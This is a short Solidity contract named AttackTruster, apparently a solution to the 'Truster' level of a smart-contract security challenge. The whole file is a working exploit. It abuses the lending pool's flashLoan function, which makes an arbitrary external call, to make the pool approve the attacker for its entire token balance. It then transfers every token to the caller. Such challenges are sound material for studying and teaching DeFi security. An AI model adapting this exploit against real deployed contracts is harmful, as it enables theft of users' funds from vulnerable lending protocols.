pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";



contract AttackTruster {
    function attack(TrusterLenderPool pool, ERC20 token) public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this), 
            token.balanceOf(address(pool))
        );
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(
            address(pool),
            msg.sender,
            token.balanceOf(address(pool))
        );
    }
}